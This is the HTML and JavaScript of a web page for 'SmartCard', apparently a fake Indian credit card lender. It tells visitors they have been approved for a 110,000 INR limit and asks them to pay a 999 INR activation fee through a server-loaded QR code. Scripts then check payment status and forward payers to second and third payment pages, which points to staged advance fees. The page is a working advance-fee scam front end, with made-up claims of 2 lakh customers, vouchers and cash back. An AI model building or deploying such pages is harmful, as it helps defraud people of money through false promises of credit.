<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Smart Card</title>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

    <!-- Theme style CSS -->      
    <!-- <link href="css/style.css" rel="stylesheet">  -->
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<style>
  
/* Footer Home pages */
.footer_area .container {
  display: flex;
  flex-wrap: wrap;
  width: 100% !important;
  justify-content: space-between;
}

.footer_inner {
  display: flex;
  flex-wrap: wrap;
  width: 100% !important;
  justify-content: space-between;
  row-gap: 20px; /* Adjust spacing between rows */
}

.footer_logo, .footer_widget {
  flex: 1 1 calc(100% / 5 - 20px); /* Distribute widgets evenly in 5 columns */
  max-width: calc(100% / 5 - 20px); /* Avoid overflow for larger screens */
  text-align: center;
}

.footer_logo img {
  margin: 0 auto;
  display: block;
}

.footer_widget h4 {
  text-align: center;
}

/* Responsive Styles */
@media (max-width: 992px) {
  .footer_logo, .footer_widget {
    flex: 1 1 calc(100% / 3 - 20px); /* Adjust to 3 columns */
    max-width: calc(100% / 3 - 20px);
  }
}

@media (max-width: 768px) {
  .footer_logo, .footer_widget {
    flex: 1 1 100%; /* Stack in a single column */
    max-width: 100%;
    text-align: left;
  }
}

.footer_area {
  display: block;
  overflow: hidden;
  background: #f59019;
  padding-top: 40px !important;
  padding-bottom: 30px;
}
.footer_area .footer_inner .footer_logo {
  margin-bottom: 50px;
}
.footer_area .footer_inner .footer_logo img {
  max-width: 100%;
}
.footer_area .footer_inner .footer_logo p {
  font: 400 16px/30px "Nunito", sans-serif;
  color: #fff;
  padding: 30px 0 50px;
}
.footer_area .footer_inner .footer_logo p a {
  color: #fff;
}
.footer_area .footer_inner .footer_logo p a:hover,
.footer_area .footer_inner .footer_logo p a:focus {
  color: #2759ab;
}
.footer_area .footer_inner .footer_logo .footer_social li {
  display: inline-block;
  transform: rotate(45deg);
  background: #fca742;
  margin-right: 37px;
  transition: all 300ms linear 0s;
}
.footer_area .footer_inner .footer_logo .footer_social li:last-child {
  margin: 0;
}
.footer_area .footer_inner .footer_logo .footer_social li a {
  height: 40px;
  width: 40px;
  text-align: center;
  color: #fff;
  display: block;
  font: normal normal normal 18px/47px FontAwesome;
  transform: rotate(-45deg);
}
.footer_area .footer_inner .footer_logo .footer_social li:hover,
.footer_area .footer_inner .footer_logo .footer_social li:focus {
  background: #2759ab;
}
.footer_area .footer_inner .footer_logo .footer_social li:hover a,
.footer_area .footer_inner .footer_logo .footer_social li:focus a {
  color: #fff;
}
.footer_area .footer_inner .footer_widget {
  padding-left: 40px;
  padding-bottom: 50px;
}
.footer_area .footer_inner .footer_widget h4 {
  font: 700 18px/1 "Nunito", sans-serif;
  color: #fff;
  padding-bottom: 35px;
  text-transform: uppercase;
  padding-top: 7px;
}
.footer_area .footer_inner .footer_widget .footer_nav li a {
  font: 600 18px/40px "Nunito", sans-serif;
  color: #ffd9ac;
}
.footer_area .footer_inner .footer_widget .footer_nav li a:hover,
.footer_area .footer_inner .footer_widget .footer_nav li a:focus {
  color: #fff;
}

.fa_2 {
  background: #252d3a;
}
.fa_2 .footer_inner .footer_logo .footer_social li {
  background: #3a424f;
}
.fa_2 .footer_inner .footer_widget .footer_nav li a {
  color: #58585a;
}

</style>
<body >
    
    
   
  <header class="bg-[#007BFF] text-white shadow-lg">
    <div class="container flex items-center justify-between p-6 mx-auto">
      <!-- Logo -->
      <div class="flex items-center space-x-4">
        <img src="images/lggg.png" alt="Logo" class="object-cover h-14 w-18" />
      </div>

      <!-- Navbar for large screens -->
      <nav class="hidden space-x-6 md:flex">
        <a id="nameField" href="#" class="text-lg font-bold text-red-600 transition">Name</a>
        <a id="amountField" href="#" class="text-lg font-bold text-red-600 transition amt">Amount</a>
        <a href="index.html" class="text-lg font-semibold transition hover:text-gray-200">Home</a>
      </nav>

      <!-- Toggle Button for small screens -->
      <button id="toggleMenu" class="block md:hidden focus:outline-none">
        <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16m-7 6h7"></path>
        </svg>
      </button>
    </div>

    <!-- Collapsible Menu for small screens -->
 <!-- Mobile Menu -->
 <nav id="mobileMenu" class="hidden md:hidden bg-[#007BFF] text-white flex flex-col items-center space-y-6 p-6 text-center">
  <a id="nameFieldMobile" href="#" class="block text-lg font-semibold text-red-600 transition">Name</a>
  <a id="amountFieldMobile" href="#" class="block text-lg font-semibold text-red-600 transition">Amount</a>
  <a href="index.html" class="block text-lg font-semibold text-red-600 transition">Home</a>
</nav>

  </header>

  <!-- JavaScript for Toggle Functionality -->
  <script>
    document.getElementById("toggleMenu").addEventListener("click", () => {
      const menu = document.getElementById("mobileMenu");

      if (menu.classList.contains("hidden")) {
        menu.classList.remove("hidden");
        menu.style.maxHeight = "500px"; // Set a max height for the expanded state
        menu.style.opacity = "1";
      } else {
        menu.style.maxHeight = "0";
        menu.style.opacity = "0";
        setTimeout(() => menu.classList.add("hidden"), 300); // Add hidden class after transition
      }
    });
  </script>
    <div class="flex flex-col items-center justify-center min-h-screen my-5 bg-gray-100">
    
     <!-- Header Area -->   

     <div class="relative text-white rounded-lg w-[90vw] max-w-[400px] h-[55vw] max-h-[250px] overflow-hidden">
      <!-- Card Background Image -->
      <img src="/images/gold_card_img.png" alt="Credit Card Background" class="absolute inset-0 object-cover w-full h-full rounded-lg">
    
      <!-- Card Content -->
      <div class="absolute inset-0 flex flex-col justify-center px-4 py-3 sm:px-6 sm:py-6">
        <!-- Card Details -->
        <div class="text-left">
          <!-- Card Number -->
          <p class="font-mono text-[4.5vw] sm:text-[3.6vw] md:text-[3vw] lg:text-[2.5vw] xl:text-[1vw] tracking-widest" id="cardNumber">
            1234 5678 9012 3456
          </p>
    
          <!-- Card Holder and Valid Thru -->
          <div class="flex justify-between mt-4 text-[2.7vw] sm:text-[2.2vw] md:text-[1.8vw] lg:text-[1.3vw]">
            <div>
              <p class="text-xs uppercase sm:text-sm lg:text-base">Card Holder</p>
              <p class="font-semibold" id="cardName">Himanshu</p>
            </div>
            <div>
              <p class="text-xs uppercase sm:text-sm lg:text-base">Valid Thru</p>
              <p class="font-semibold" id="cardDate">MM/YY</p>
            </div>
          </div>
        </div>
      </div>
    </div>

   <!-- Additional Section Below -->
   <div class="w-[90vw] max-w-[600px] mt-8 p-6 rounded-lg shadow-lg bg-white">
    <!-- Title Section -->
    <h3 class="flex items-center justify-center mb-4 text-4xl font-bold text-center">
      <img src="/static/images/star.png" width="40px" alt="Star Icon" class="mr-2"> 
      Congratulations 
      <img src="/static/images/star.png" width="40px" alt="Star Icon" class="ml-2">
    </h3>
  
    <!-- Subtitle Section -->
    <p class="m-0 text-base font-medium text-center text-red-500">Your Credit Card Limit</p>
    <p class="m-0 text-base font-medium text-center text-red-500 amt">110000.00 INR</p>
  
    <!-- Description Section -->
    <p class="mt-4 font-medium text-black">
      Welcome to SmartCard  family, India's leading NBFC finance company with more than 2 lakh happy customers across India.
      Your credit card limit is <span class="text-red-500 amt">110000.00 INR</span> with a return period of <span class="text-red-500">60 days</span> and low interest rates.
      For your card activation, please make a one-time card-making delivery and processing charge of 999.00 INR. You can use your virtual card after paying these charges.
      Then, make your card insurance and start using your card. The physical card will be delivered in 3 to 5 working days.
      Please pay activation charges via the company's QR code shown below, and your card will be ready to use.
    </p>
  </div>
  <div class="w-[90vw] max-w-[600px] mt-8 p-6 rounded-lg shadow-lg bg-white">
    <h3 class="flex items-center justify-center mb-6 space-x-2 text-3xl font-bold text-center text-black">
        <!-- Material Icon (Simple) -->
        <img src="/static/images/star.png" width="40px" alt="Star Icon" class="mr-2"> 
        <span>Benefits Of Card</span>
        <!-- Font Awesome Icon (Solid) -->
        <i class="text-blue-500 fas fa-gift"></i>
      </h3>
    
    <!-- List of Benefits -->
    <ul class="space-y-4">
      <li class="flex items-center text-lg text-gray-700">
        <span class="mr-3 text-green-500 material-icons">check_circle</span>
        Get instant 2000 shopping voucher.
      </li>
      <li class="flex items-center text-lg text-gray-700">
        <span class="mr-3 text-yellow-500 material-icons">check_circle</span>
        Get instant 1000 shopping voucher.
      </li>
      <li class="flex items-center text-lg text-gray-700">
        <span class="mr-3 text-blue-500 material-icons">check_circle</span>
        Get 2% assured cash back on HP petrol pumps all over India.
      </li>
      <li class="flex items-center text-lg text-gray-700">
        <span class="mr-3 text-red-500 material-icons">check_circle</span>
        No annual fees and lifetime free.
      </li>
      <li class="flex items-center text-lg text-gray-700">
        <span class="mr-3 text-purple-500 material-icons ">check_circle</span>
       <span class="amt">110000</span>  cash withdrawal limit.
      </li>
    </ul>
  </div>
 
  <!-- QR Code Section -->
  <div class="w-[90vw] max-w-[600px] mt-8 p-6 rounded-lg shadow-lg bg-white">
  
    <h3 class="flex items-center justify-center mb-6 space-x-2 text-3xl font-bold text-center text-black">
        <!-- Material Icon (Simple) -->
        <img src="/static/images/star.png" width="40px" alt="Star Icon" class="mr-2">  Activate Your Card <img src="/static/images/star.png" width="40px" alt="Star Icon" class="mr-2"> 
       <i class="text-blue-500 fas fa-gift"></i>
      </h3>
    
    <!-- QR Image -->
    <div class="flex justify-center">
      <img src="/images/qr.png" alt="QR Code" class="w-full max-w-[300px] h-auto"/>
    </div>
    <!-- Instructions for QR Scan -->
    <p class="mt-4 text-lg text-center text-gray-700">
      Scan the QR code above to make your payment of ₹999 for card activation. After successful payment, your virtual card will be activated, and You will be re-direct to the Second page
  </div>
  </div>
  
<footer class="footer_area">
  <div class="container">
      <div class="footer_inner row"> 
          <!-- Logo and Copyright Section -->
          <div class="col-xl-4 col-md-5 col-sm-7 footer_logo wow fadeIn">
            <a href="index.html"> <img src="images/lggg.png" width="70px"  alt=""></a>  
            <p>SmartCard</a>. All rights reserved</p> 
              <ul class="footer_social">
                  <li><a href="#" class="fab fa-facebook"></a></li>
                  <li><a href="#" class="fab fa-twitter"></a></li>
                  <li><a href="#" class="fab fa-linkedin"></a></li>
                  <li><a href="#" class="fab fa-google-plus"></a></li>
              </ul>
          </div> 

          <!-- About Section -->
          <div class="footer_widget col-xl-2 col-md-4 col-sm-5 wow fadeIn" data-wow-delay="0.2s">
              <h4>About</h4>
              <ul class="footer_nav"> 
                  <li><a href="#">How it Works</a></li>
                  <li><a href="#">Guarantee</a></li>
                  <li><a href="#">Security</a></li>
                  <li><a href="contact.html">Contact</a></li>
                  <li><a href="#">Our Story</a></li> 
              </ul>
          </div>  

          <!-- Loan Solutions Section -->
          <!-- <div class="footer_widget col-xl-2 col-md-3 col-sm-4 wow fadeIn" data-wow-delay="0.4s">
              <h4>Solutions</h4>
              <ul class="footer_nav">  
                  <li><a href="#">Car Loan</a></li> 
                  <li><a href="#">Personal Loan</a></li> 
                  <li><a href="#">Education Loan</a></li> 
                  <li><a href="#">Business Loan</a></li>  
              </ul>
          </div>  -->

          <!-- Help Section -->
          <div class="footer_widget col-xl-2 col-md-5 col-sm-4 wow fadeIn" data-wow-delay="0.6s">
              <h4>Need Help?</h4>
              <ul class="footer_nav">   
                  <li><a href="#">Find a Branch</a></li>    
                  <li><a href="contact.html">Contact Us</a></li>    
                  <li><a href="faq.html">FAQ</a></li>    
                  <li><a href="#">APR</a></li>    
              </ul>
          </div> 

          <!-- Save & Invest Section -->
          <div class="footer_widget col-xl-2 col-md-4 col-sm-4 wow fadeIn" data-wow-delay="0.8s">
              <h4>Save &amp; Invest</h4>
              <ul class="footer_nav">   
                  <li><a href="#">Credit Cards</a></li>  
                  <li><a href="#">Mortgages</a></li>  
                  <li><a href="#">Home Equity</a></li>  
                  <li><a href="#">Lines of Credit</a></li>  
              </ul>
          </div>  
      </div>
  </div>  
</footer>
  <script src="https://cdn.jsdelivr.net/npm/jwt-decode/build/jwt-decode.min.js"></script>
  <script>
  document.addEventListener("DOMContentLoaded", async () => {
  try {
    const token = localStorage.getItem("token");const cardDate = document.getElementById("cardDate");

if (cardDate) {
  const month = "11"; // Replace this with the dynamic month value if needed
  const year = "29";  // Replace this with the dynamic year value if needed

  cardDate.textContent = `${month}/${year}`; // Update the text content
}


    if (!token) {
      window.location.href = "index.html";
      return;
    }

    const decodedToken = jwt_decode(token);
    const userId = decodedToken.id;

    if (!userId) return;

    const response = await fetch(`http://localhost:3001/getUserDeatilsData/${userId}`, {
      headers: {
        Authorization: `Bearer ${token}`,
      },
    });

    const data = await response.json();

    if (response.ok) {
      const { name, cardamount ,number} = data.userData;

      // Update both desktop and mobile menus
      const nameFieldDesktop = document.getElementById("nameField");
      const cardNumber = document.getElementById("cardNumber")
      // const amountFieldDesktop = document.querySelectorAll(".amt");
      const nameFieldMobile = document.getElementById("nameFieldMobile");
      const amountFieldMobile = document.getElementById("amountFieldMobile");
      const cardName =document.getElementById("cardName");
      if(cardName)
    {
      cardName.textContent = name
    }

      if (nameFieldDesktop) nameFieldDesktop.textContent = name;
      // if (amountFieldDesktop) amountFieldDesktop.textContent = `₹ ${cardamount}`;
      const amountFields = document.querySelectorAll(".amt"); // Correct selector with a dot for class
     if(amountFields)
     {
      amountFields.forEach((field) => {
        field.textContent = `₹ ${cardamount}`;
      });
     }
     if (cardNumber) {
  const rawNumber = `15${number}9292`; // Original number
  const formattedNumber = rawNumber.replace(/(\d{4})(?=\d)/g, "$1 "); // Group into 4 digits separated by spaces
  cardNumber.textContent = formattedNumber.trim(); // Update the content with the formatted number
}

      if (nameFieldMobile) nameFieldMobile.textContent = name;
      if (amountFieldMobile) amountFieldMobile.textContent = `₹ ${cardamount}`;
    } else {
      console.error("Failed to fetch user data:", data.message);
    }
  } catch (error) {
    console.error("Error fetching user data:", error);
  }
});

  </script>

  <script>
      const checkTokenAndStatuses = async () => {
      const token = localStorage.getItem("token"); // Adjust storage if using cookies

      if (!token) {
        // Redirect to index.html if no token
        window.location.href = "index.html";
        return;
      }

      try {
        // Decode the token to get the user ID
        const decodedToken = jwt_decode(token);
        const userId = decodedToken.id;

        // Call API to get payment statuses, sending `id` as a query parameter
        const response = await fetch(`http://localhost:3001/getPaymentStatuses/${userId}`, {
  method: "GET",
  headers: {
    Authorization: `Bearer ${token}`, // Add token to headers if required
  },
});


        const data = await response.json();
        console.log(data)

        if (response.ok) {
          const { FirstPayStatus, SecondPayStatus } = data.data;

          // Redirect based on statuses
          if (FirstPayStatus === 0 && SecondPayStatus === 0) {
            console.log("User stays on this page.");
          } else if (FirstPayStatus === 1 && SecondPayStatus === 0) {
            window.location.href = "secondcard.html";
          } else if (FirstPayStatus === 1 && SecondPayStatus === 1) {
            window.location.href = "thirdcard.html";
          }
        } else {
          console.error("Error fetching statuses:", data.message);
        }
      } catch (error) {
        console.error("Error decoding token or calling API:", error.message);
        // window.location.href = "index.html"; // Redirect to index.html on failure
      }
    };

  

    // Set an interval to run it every 3 seconds
    setInterval(checkTokenAndStatuses, 8000);
  </script>

<script>
  document.addEventListener("DOMContentLoaded", async () => {
    try {
    

      const response = await fetch("http://localhost:3001/getProfile");

if (!response.ok) {
  throw new Error("Failed to fetch company profile");
}

      const data = await response.json();

      if (response.ok) {
        // console.log(data)
        const { profile } = data;
        const { QRImg } = profile;
        // alert(QRImg)

        // Update the QR image dynamically
        const qrImage = document.querySelector("img[alt='QR Code']");
        if (qrImage && QRImg) {
          qrImage.src = `/uploads/${QRImg}`;
        }
      } else {
        console.error("Failed to fetch profile:", data.message);
      }
    } catch (error) {
      console.error("Error fetching profile data:", error);
    }
  });
</script>

</body>
</html>
